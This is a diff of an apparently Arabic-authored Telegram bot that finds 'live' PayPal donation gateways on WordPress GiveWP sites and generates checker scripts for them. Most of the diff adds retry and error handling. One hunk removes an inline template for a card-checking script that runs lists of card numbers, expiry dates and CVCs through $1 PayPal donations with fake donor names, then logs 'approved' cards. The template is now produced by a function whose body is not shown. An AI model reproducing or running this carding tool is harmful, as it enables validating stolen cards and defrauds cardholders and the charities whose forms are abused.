@@ -8,6 +8,7 @@ from datetime import datetime, timedelta
 import os
 import html
 import gc
+import sys
 from user_agent import generate_user_agent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
@@ -47,65 +48,252 @@ waiting_users = {}
 reply_mode = {}
 processing_status = {}
 
+# تتبع الأخطاء
+error_counter = {
+    '502': 0,
+    '429': 0,
+    '500': 0,
+    'timeout': 0,
+    'connection': 0
+}
+
 if not os.path.exists('blockusers.txt'):
     with open('blockusers.txt', 'w') as f:
         f.write('')
 
-def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=5):
+def track_error(error_type):
+    """تتبع الأخطاء المتتالية"""
+    if error_type in error_counter:
+        error_counter[error_type] += 1
+        if error_counter[error_type] > 10:
+            print(f"⚠️ Too many {error_type} errors! Waiting 60s...")
+            time.sleep(60)
+            error_counter[error_type] = 0
+    else:
+        for key in error_counter:
+            error_counter[key] = 0
+
+def reset_error_counter():
+    """إعادة تعيين عداد الأخطاء"""
+    for key in error_counter:
+        error_counter[key] = 0
+
+def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=10):
+    """نسخة محسنة تتعامل مع جميع أنواع الأخطاء"""
     for i in range(retries):
         try:
-            return bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
+            result = bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
+            reset_error_counter()
+            return result
         except Exception as e:
-            if "429" in str(e):
+            error_str = str(e)
+            
+            if "429" in error_str:
+                track_error('429')
                 try:
-                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
+                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
                 except:
                     wait_time = 30
                 print(f"⏳ FloodWait (edit): {wait_time}s")
                 time.sleep(min(wait_time + 5, 65))
-            elif "502" in str(e) or "Bad Gateway" in str(e):
-                print(f"⚠️ 502 Error (edit), retrying...")
-                time.sleep(5)
+                
+            elif "502" in error_str or "Bad Gateway" in error_str:
+                track_error('502')
+                wait_time = 5 * (i + 1)
+                print(f"⚠️ 502 Bad Gateway (edit) - attempt {i+1}/{retries}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
+            elif "500" in error_str or "Internal Server Error" in error_str:
+                track_error('500')
+                wait_time = 3 * (i + 1)
+                print(f"⚠️ 500 Error (edit) - attempt {i+1}/{retries}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
+            elif "Timed out" in error_str or "timeout" in error_str.lower():
+                track_error('timeout')
+                wait_time = 2 * (i + 1)
+                print(f"⚠️ Timeout (edit) - attempt {i+1}/{retries}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
+            elif "Connection" in error_str or "ConnectionError" in error_str:
+                track_error('connection')
+                wait_time = 3 * (i + 1)
+                print(f"⚠️ Connection Error (edit) - attempt {i+1}/{retries}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
             else:
+                print(f"❌ Error (edit): {error_str[:100]}")
                 break
     return None
 
-def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=5):
+def safe_send_message(chat_id, text, parse_mode="HTML", retries=10, reply_markup=None):
+    """نسخة محسنة تتعامل مع جميع أنواع الأخطاء"""
     for i in range(retries):
         try:
-            with open(file_path, 'rb') as f:
-                return bot.send_document(chat_id, f, caption=caption, parse_mode=parse_mode)
+            result = bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
+            reset_error_counter()
+            return result
         except Exception as e:
-            if "429" in str(e):
+            error_str = str(e)
+            
+            if "429" in error_str:
+                track_error('429')
                 try:
-                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
-                except:
-                    wait_time = 30
-                print(f"⏳ FloodWait (send): {wait_time}s")
-                time.sleep(min(wait_time + 5, 65))
-            elif "502" in str(e) or "Bad Gateway" in str(e):
-                print(f"⚠️ 502 Error (send), retrying...")
-                time.sleep(5)
-            else:
-                break
-    return None
-
-def safe_send_message(chat_id, text, parse_mode="HTML", retries=5, reply_markup=None):
-    for i in range(retries):
-        try:
-            return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
-        except Exception as e:
-            if "429" in str(e):
-                try:
-                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
+                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
                 except:
                     wait_time = 30
                 print(f"⏳ FloodWait (msg): {wait_time}s")
                 time.sleep(min(wait_time + 5, 65))
-            elif "502" in str(e) or "Bad Gateway" in str(e):
-                print(f"⚠️ 502 Error (msg), retrying...")
-                time.sleep(5)
+                
+            elif "502" in error_str or "Bad Gateway" in error_str:
+                track_error('502')
+                wait_time = 5 * (i + 1)
+                print(f"⚠️ 502 Bad Gateway (msg) - attempt {i+1}/{retries}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
+            elif "500" in error_str or "Internal Server Error" in error_str:
+                track_error('500')
+                wait_time = 3 * (i + 1)
+                print(f"⚠️ 500 Error (msg) - attempt {i+1}/{retries}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
+            elif "Timed out" in error_str or "timeout" in error_str.lower():
+                track_error('timeout')
+                wait_time = 2 * (i + 1)
+                print(f"⚠️ Timeout (msg) - attempt {i+1}/{retries}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
+            elif "Connection" in error_str or "ConnectionError" in error_str:
+                track_error('connection')
+                wait_time = 3 * (i + 1)
+                print(f"⚠️ Connection Error (msg) - attempt {i+1}/{retries}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
             else:
+                print(f"❌ Error (msg): {error_str[:100]}")
+                break
+    return None
+
+def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=10):
+    """نسخة محسنة تتعامل مع جميع أنواع الأخطاء"""
+    for i in range(retries):
+        try:
+            with open(file_path, 'rb') as f:
+                result = bot.send_document(chat_id, f, caption=caption, parse_mode=parse_mode)
+            reset_error_counter()
+            return result
+        except Exception as e:
+            error_str = str(e)
+            
+            if "429" in error_str:
+                track_error('429')
+                try:
+                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
+                except:
+                    wait_time = 30
+                print(f"⏳ FloodWait (send): {wait_time}s")
+                time.sleep(min(wait_time + 5, 65))
+                
+            elif "502" in error_str or "Bad Gateway" in error_str:
+                track_error('502')
+                wait_time = 5 * (i + 1)
+                print(f"⚠️ 502 Bad Gateway (send) - attempt {i+1}/{retries}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
+            elif "500" in error_str or "Internal Server Error" in error_str:
+                track_error('500')
+                wait_time = 3 * (i + 1)
+                print(f"⚠️ 500 Error (send) - attempt {i+1}/{retries}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
+            elif "Timed out" in error_str or "timeout" in error_str.lower():
+                track_error('timeout')
+                wait_time = 2 * (i + 1)
+                print(f"⚠️ Timeout (send) - attempt {i+1}/{retries}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
+            elif "Connection" in error_str or "ConnectionError" in error_str:
+                track_error('connection')
+                wait_time = 3 * (i + 1)
+                print(f"⚠️ Connection Error (send) - attempt {i+1}/{retries}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
+            else:
+                print(f"❌ Error (send): {error_str[:100]}")
+                break
+    return None
+
+def safe_get_file(file_id, retries=10):
+    """تحميل ملف مع معالجة الأخطاء"""
+    for i in range(retries):
+        try:
+            result = bot.get_file(file_id)
+            reset_error_counter()
+            return result
+        except Exception as e:
+            error_str = str(e)
+            
+            if "502" in error_str or "Bad Gateway" in error_str:
+                track_error('502')
+                wait_time = 5 * (i + 1)
+                print(f"⚠️ 502 in get_file - attempt {i+1}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
+            elif "429" in error_str:
+                track_error('429')
+                wait_time = 30
+                try:
+                    wait_time = int(error_str.split("retry after ")[1].split(")")[0])
+                except:
+                    pass
+                print(f"⏳ FloodWait in get_file: {wait_time}s")
+                time.sleep(min(wait_time, 60))
+                
+            elif "500" in error_str:
+                track_error('500')
+                wait_time = 3 * (i + 1)
+                print(f"⚠️ 500 in get_file - attempt {i+1}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
+            else:
+                print(f"❌ Error in get_file: {error_str[:100]}")
+                break
+    return None
+
+def safe_download_file(file_path, retries=10):
+    """تحميل ملف مع معالجة الأخطاء"""
+    for i in range(retries):
+        try:
+            result = bot.download_file(file_path)
+            reset_error_counter()
+            return result
+        except Exception as e:
+            error_str = str(e)
+            
+            if "502" in error_str or "Bad Gateway" in error_str:
+                track_error('502')
+                wait_time = 5 * (i + 1)
+                print(f"⚠️ 502 in download - attempt {i+1}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
+            elif "429" in error_str:
+                track_error('429')
+                wait_time = 30
+                try:
+                    wait_time = int(error_str.split("retry after ")[1].split(")")[0])
+                except:
+                    pass
+                print(f"⏳ FloodWait in download: {wait_time}s")
+                time.sleep(min(wait_time, 60))
+                
+            elif "500" in error_str:
+                track_error('500')
+                wait_time = 3 * (i + 1)
+                print(f"⚠️ 500 in download - attempt {i+1}, waiting {wait_time}s...")
+                time.sleep(wait_time)
+                
+            else:
+                print(f"❌ Error in download: {error_str[:100]}")
                 break
     return None
 
@@ -823,126 +1011,7 @@ def ali_al2(massege):
 
         file_name = f'gateway_{int(time.time())}.py'
         with open(file_name, "w", encoding="utf-8") as f:
-            f.write(f'''import requests, re, random, time, base64
-from fake_useragent import UserAgent
-from requests_toolbelt.multipart.encoder import MultipartEncoder
-from urllib.parse import urlparse
-
-class PayPal:
-    def __init__(self):
-        self.first_name = ["James", "John", "Robert", "Michael", "William"]
-        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
-        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
-        self.donation = "1.00"
-        self.id_form1 = "{paypal.form_data.get('give-form-id-prefix', '')}"
-        self.id_form2 = "{paypal.form_data.get('give-form-id', '')}"
-        self.nonec = "{paypal.form_data.get('give-form-hash', '')}"
-        self.au = "{paypal.client_token or paypal.access_token or ''}"
-        url = '{link}'
-        parsed = urlparse(url)
-        self.url = parsed.netloc
-        self.inurl = parsed.path
-        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
-        self.r = requests.Session()
-        self.uu = UserAgent()
-        self.checked = 0
-
-    def Key(self):
-        return self.au, self.id_form1, self.id_form2, self.nonec
-
-    def Charge(self, ccx):
-        self.checked += 1
-        ccx = ccx.strip()
-        n = ccx.split("|")[0]
-        mm = ccx.split("|")[1]
-        yy = ccx.split("|")[2]
-        cvc = ccx.split("|")[3].strip()
-        if "20" in yy:
-            yy = yy.split("20")[1]
-        
-        da2 = MultipartEncoder({{
-            'give-form-id-prefix': (None, self.id_form1),
-            'give-form-id': (None, self.id_form2),
-            'give-form-hash': (None, self.nonec),
-            'give-amount': (None, self.donation),
-            'payment-mode': (None, 'paypal-commerce'),
-            'give_first': (None, random.choice(self.first_name)),
-            'give_last': (None, random.choice(self.last_name)),
-            'give_email': (None, self.email),
-            'give-gateway': (None, 'paypal-commerce'),
-        }})
-        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
-        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
-        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']
-
-        he4 = {{'authorization': f'Bearer {{self.au}}', 'paypal-client-metadata-id': self.paypal, 'user-agent': self.uu.random}}
-        da3 = {{
-            'payment_source': {{
-                'card': {{
-                    'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
-                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
-                }},
-            }},
-            'application_context': {{'vault': False}},
-        }}
-        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)
-
-        da4 = MultipartEncoder({{
-            'give-form-id-prefix': (None, self.id_form1),
-            'give-form-id': (None, self.id_form2),
-            'give-form-hash': (None, self.nonec),
-            'give-amount': (None, self.donation),
-            'payment-mode': (None, 'paypal-commerce'),
-            'give_first': (None, random.choice(self.first_name)),
-            'give_last': (None, random.choice(self.last_name)),
-            'give_email': (None, self.email),
-            'give-gateway': (None, 'paypal-commerce'),
-        }})
-        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
-        pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
-        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
-        
-        text = r5.text
-        if 'true' in text: return 'CHARGE 1.00$'
-        elif 'INSUFFICIENT_FUNDS' in text: return "INSUFFICIENT_FUNDS"
-        elif 'ORDER_NOT_APPROVED' in text: return "Payer cannot pay for this transaction."
-        else:
-            try: return r5.json()['data']['error']
-            except: return "UNKNOWN_ERROR"
-
-if __name__ == '__main__':
-    Getat = 'PayPal Custom 1$'
-    print(f'Cheker {{Getat}}')
-    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
-    if Br == '1':
-        while True:
-            ar = input('Enter Card ( n | mm | yy | cvc ): ')
-            rr = PayPal()
-            itt = rr.Key()
-            resulti = rr.Charge(ar)
-            if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
-                with open('Approved Card.txt', "a") as f:
-                    f.write(ar + f': {{resulti}} > {{Getat}}')
-            print('Response: ' + resulti)
-            time.sleep(5)
-    else:
-        noy = 0
-        cr = input('Enter Name Combo: ')
-        with open(cr, "r") as f:
-            crads = f.read().splitlines()
-            for P in crads:
-                noy += 1
-                try:
-                    rr = PayPal()
-                    itt = rr.Key()
-                    resulti = rr.Charge(P)
-                except Exception as e:
-                    resulti = f'Error {{e}}'
-                if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
-                    with open('Approved Card.txt', "a") as f:
-                        f.write(P + ': {{resulti}} > {{Getat}}')
-                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
-                time.sleep(13)''')
+            f.write(generate_gateway_code(result))
         
         safe_send_document(massege.chat.id, file_name, caption=f'''✅ <b>Live Gateway Found!</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{link}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Response:</b> <code>{result}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30''')
         os.remove(file_name)
@@ -1021,6 +1090,7 @@ def check_single_link(link):
                 pass
 
 def generate_gateway_code(result):
+    """توليد كود Gateway من بيانات result"""
     return f'''import requests, re, random, time, base64
 from fake_useragent import UserAgent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
@@ -1148,8 +1218,16 @@ def process_mass_file(message):
         return
 
     try:
-        file_info = bot.get_file(message.document.file_id)
-        downloaded_file = bot.download_file(file_info.file_path)
+        file_info = safe_get_file(message.document.file_id)
+        if not file_info:
+            safe_send_message(message.chat.id, "❌ Failed to get file. Please try again.")
+            return
+            
+        downloaded_file = safe_download_file(file_info.file_path)
+        if not downloaded_file:
+            safe_send_message(message.chat.id, "❌ Failed to download file. Please try again.")
+            return
+            
         links = downloaded_file.decode('utf-8', errors='ignore').splitlines()
         links = [link.strip() for link in links if link.strip()]
 
@@ -1176,6 +1254,7 @@ def process_mass_file(message):
             last_text = ""
             last_edit_time = time.time()
             min_edit_interval = 20
+            consecutive_errors = 0
             
             while True:
                 time.sleep(15)
@@ -1199,33 +1278,32 @@ def process_mass_file(message):
                         
                         if text != last_text:
                             try:
-                                for retry in range(3):
+                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
+                                last_text = text
+                                last_edit_time = time.time()
+                                consecutive_errors = 0
+                            except Exception as e:
+                                error_str = str(e)
+                                
+                                if "502" in error_str or "Bad Gateway" in error_str:
+                                    consecutive_errors += 1
+                                    print(f"⚠️ 502 in update_status - error #{consecutive_errors}")
+                                    if consecutive_errors > 5:
+                                        time.sleep(30)
+                                    else:
+                                        time.sleep(10)
+                                        
+                                elif "429" in error_str:
+                                    wait_time = 30
                                     try:
-                                        bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
-                                        last_text = text
-                                        last_edit_time = time.time()
-                                        break
-                                    except Exception as e:
-                                        if "429" in str(e):
-                                            wait_time = 30
-                                            try:
-                                                wait_time = int(str(e).split("retry after ")[1].split(")")[0])
-                                            except:
-                                                pass
-                                            print(f"⏳ FloodWait: {wait_time}s")
-                                            time.sleep(min(wait_time, 60))
-                                        elif "retry after" in str(e).lower():
-                                            wait_time = 30
-                                            try:
-                                                wait_time = int(str(e).split("retry after ")[1].split(")")[0])
-                                            except:
-                                                pass
-                                            print(f"⏳ FloodWait: {wait_time}s")
-                                            time.sleep(min(wait_time, 60))
-                                        else:
-                                            break
-                            except:
-                                pass
+                                        wait_time = int(error_str.split("retry after ")[1].split(")")[0])
+                                    except:
+                                        pass
+                                    print(f"⏳ FloodWait in update_status: {wait_time}s")
+                                    time.sleep(min(wait_time, 60))
+                                    
+                                else:
+                                    pass
                 except:
                     pass
 
@@ -1257,21 +1335,7 @@ def process_mass_file(message):
                         with open(file_name, 'w', encoding='utf-8') as f:
                             f.write(code)
                         
-                        for retry in range(3):
-                            try:
-                                safe_send_document(chat_id, file_name, caption=f"""✅ <b>Live Gateway #{live_idx}</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{result['link']}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Respons:</b> <code>{result['respons']}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30""")
-                                break
-                            except Exception as e:
-                                if "429" in str(e):
-                                    wait_time = 30
-                                    try:
-                                        wait_time = int(str(e).split("retry after ")[1].split(")")[0])
-                                    except:
-                                        pass
-                                    print(f"⏳ FloodWait (send file): {wait_time}s")
-                                    time.sleep(min(wait_time, 60))
-                                else:
-                                    break
+                        safe_send_document(chat_id, file_name, caption=f"""✅ <b>Live Gateway #{live_idx}</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{result['link']}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Respons:</b> <code>{result['respons']}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30""")
                         
                         try:
                             os.remove(file_name)
@@ -1356,10 +1420,47 @@ print('✅ Bot is running...')
 if __name__ == '__main__':
     while True:
         try:
-            bot.polling(none_stop=True, interval=0, timeout=30)
+            print("🔄 Starting bot polling...")
+            bot.polling(none_stop=True, interval=0, timeout=30, long_polling_timeout=30)
+            
         except KeyboardInterrupt:
             print('🛑 Bot stopped by user')
             break
+            
         except Exception as e:
-            print(f'❌ Error: {e}')
-            time.sleep(5)
+            error_str = str(e)
+            
+            if "502" in error_str or "Bad Gateway" in error_str:
+                print(f'⚠️ 502 Bad Gateway - Telegram server issue. Waiting 10s...')
+                time.sleep(10)
+                continue
+                
+            elif "409" in error_str:
+                print(f'⚠️ 409 Conflict - Another instance running. Waiting 15s...')
+                time.sleep(15)
+                continue
+                
+            elif "429" in error_str:
+                print(f'⚠️ 429 Too Many Requests. Waiting 30s...')
+                time.sleep(30)
+                continue
+                
+            elif "ReadTimeout" in error_str or "timeout" in error_str.lower():
+                print(f'⚠️ Timeout. Retrying in 5s...')
+                time.sleep(5)
+                continue
+                
+            elif "Connection" in error_str or "ConnectionError" in error_str:
+                print(f'⚠️ Connection error. Retrying in 5s...')
+                time.sleep(5)
+                continue
+                
+            elif "500" in error_str or "Internal Server Error" in error_str:
+                print(f'⚠️ 500 Internal Server Error. Retrying in 10s...')
+                time.sleep(10)
+                continue
+                
+            else:
+                print(f'❌ Unexpected error: {error_str[:200]}')
+                time.sleep(5)
+                continue
